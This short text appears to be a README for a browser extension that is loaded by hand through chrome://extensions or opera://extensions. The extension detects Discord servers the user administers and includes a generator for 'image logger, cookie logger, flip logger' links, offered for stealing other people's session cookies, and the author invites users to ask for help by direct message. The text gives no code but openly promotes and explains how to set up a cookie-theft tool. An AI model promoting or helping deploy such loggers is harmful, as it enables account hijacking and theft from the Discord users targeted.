You do not need to change anything in the extension file, It operates on its own and detects discord servers you own or have admin in.
You will have to drag it into your extensions on your browsers (for example google being chrome://extensions or opera gx opera://extensions)
One more thing, it will include when you put into extensions a generator to show what you want for the links, it include image logger, cookie logger, flip logger, etc.

Good luck to anyone who uses this cookie logger

And remember DM me for help

Goodbye.
